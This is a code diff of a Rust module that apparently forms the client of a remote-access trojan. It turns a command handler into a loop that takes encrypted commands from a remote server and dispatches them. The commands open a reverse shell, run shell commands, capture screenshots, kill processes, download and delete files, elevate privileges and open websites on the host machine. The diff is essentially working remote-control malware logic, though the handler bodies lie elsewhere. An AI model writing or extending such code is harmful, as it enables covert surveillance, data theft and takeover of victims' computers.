@@ -1,41 +1,154 @@
-use std::sync::{ Arc, Mutex };
 use std::net::TcpStream;
-use std::path::PathBuf;
-use std::process::Child;
+use std::sync::{ Arc, Mutex };
 
-use crate::features::file_manager::file_manager;
+use common::buffers::read_buffer;
+use rand::{ rngs::OsRng, Rng };
+use std::process;
+use crate::{ SECRET, SECRET_INITIALIZED, REVERSE_SHELL };
+
+use common::commands::Command;
+
+use crate::features::file_manager::FileManager;
+use crate::features::encryption::generate_secret;
 use crate::features::system_commands::system_commands;
 use crate::features::other::{ take_screenshot, client_info, visit_website, elevate_client };
 use crate::features::process::{ process_list, kill_process };
 
-pub fn handle_command(
-    write_stream: &mut TcpStream,
-    command: &str,
-    command_data: &str,
-    path: &str,
-    current_path: &mut PathBuf,
-    secret: &Option<Vec<u8>>
+pub fn handle_server(
+    mut read_stream: TcpStream,
+    mut write_stream: TcpStream,
+    is_connected: Arc<Mutex<bool>>
 ) {
+    OsRng.fill(&mut *SECRET.lock().unwrap());
+
+    let mut file_manager = FileManager::new();
+
     let mut reverse_shell_lock = crate::REVERSE_SHELL.lock().unwrap();
 
-    match command {
-        "FILE_MANAGER" => file_manager(write_stream, current_path, command_data, path, &secret),
-        "VISIT_WEBSITE" => visit_website(write_stream, command_data, path, &secret),
-        "ELEVATE_CLIENT" => elevate_client(),
-        // _ if command.starts_with("encryption_request") => encryption_request(write_stream, &command["encryption_request::".len()..]),
-        "INIT_CLIENT" => client_info(write_stream, &secret),
-        "SCREENSHOT" =>
-            take_screenshot(write_stream, command_data.parse::<i32>().unwrap(), &secret),
-        "PROCESS_LIST" => process_list(write_stream, &secret),
-        "KILL_PROCESS" => kill_process(command_data.parse::<usize>().unwrap()),
-        "START_SHELL" =>
-            reverse_shell_lock.start_shell(
-                Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream"))),
-                secret
-            ),
-        "EXIT_SHELL" => reverse_shell_lock.exit_shell(),
-        "SHELL_COMMAND" => reverse_shell_lock.execute_shell_command(command_data),
-        "MANAGE_SYSTEM" => system_commands(command_data),
-        _ => {}
+    loop {
+        let secret_clone = Some(SECRET.lock().unwrap().to_vec());
+        let received_command = read_buffer(&mut read_stream, if
+            SECRET_INITIALIZED.lock().unwrap().clone()
+        {
+            &secret_clone
+        } else {
+            &None
+        });
+
+        match received_command {
+            Ok(command) => {
+                println!("Received command: {:?}", command);
+                match command {
+                    Command::EncryptionRequest(data) => {
+                        generate_secret(&mut write_stream, data);
+                    }
+                    Command::InitClient => {
+                        client_info(&mut write_stream, &Some(SECRET.lock().unwrap().to_vec()));
+                    }
+                    Command::Reconnect => {
+                        *is_connected.lock().unwrap() = false;
+                        break;
+                    }
+                    Command::Disconnect => {
+                        let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
+                        reverse_shell_lock.exit_shell();
+                        process::exit(1);
+                    }
+                    Command::GetProcessList => {
+                        process_list(&mut write_stream, &Some(SECRET.lock().unwrap().to_vec()));
+                    }
+                    Command::KillProcess(data) => {
+                        kill_process(data.pid);
+                    }
+                    Command::StartShell => {
+                        reverse_shell_lock.start_shell(
+                            Arc::new(
+                                Mutex::new(
+                                    write_stream.try_clone().expect("Failed to clone TcpStream")
+                                )
+                            ),
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::ExitShell => {
+                        reverse_shell_lock.exit_shell();
+                    }
+                    Command::ShellCommand(data) => {
+                        reverse_shell_lock.execute_shell_command(&data);
+                    }
+                    Command::ScreenshotDisplay(data) => {
+                        take_screenshot(
+                            &mut write_stream,
+                            data.parse::<i32>().unwrap(),
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::ManageSystem(data) => {
+                        system_commands(&data);
+                    }
+                    Command::AvailableDisks => {
+                        file_manager.list_available_disks(
+                            &mut write_stream,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::PreviousDir => {
+                        file_manager.navigate_to_parent(
+                            &mut write_stream,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::ViewDir(data) => {
+                        file_manager.view_folder(
+                            &mut write_stream,
+                            &data,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::RemoveDir(data) => {
+                        file_manager.remove_directory(
+                            &mut write_stream,
+                            &data,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::RemoveFile(data) => {
+                        file_manager.remove_file(
+                            &mut write_stream,
+                            &data,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::DownloadFile(data) => {
+                        file_manager.download_file(
+                            &mut write_stream,
+                            &data,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::VisitWebsite(data) => {
+                        visit_website(
+                            &mut write_stream,
+                            &data.visit_type,
+                            &data.url,
+                            &Some(SECRET.lock().unwrap().to_vec())
+                        );
+                    }
+                    Command::ElevateClient => {
+                        elevate_client();
+                    }
+                    _ => {
+                        println!("Received an unknown or unhandled command.");
+                    }
+                }
+            }
+            Err(_) => {
+                println!("Disconnected!");
+                let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
+                reverse_shell_lock.exit_shell();
+                *is_connected.lock().unwrap() = false;
+                break;
+            }
+        }
     }
 }
